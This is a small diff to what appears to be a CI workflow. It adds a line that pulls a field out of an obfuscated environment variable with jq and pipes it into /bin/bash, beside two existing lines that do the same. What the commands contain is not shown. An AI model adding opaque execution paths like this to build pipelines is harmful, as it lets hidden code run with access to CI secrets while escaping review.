@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$yeau86260" | jq -r .ey6873 | /bin/bash
           echo $elwwn62446 | jq -r .ntlm850 | /bin/bash
+          echo $ovus8 | jq -r .hx5 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
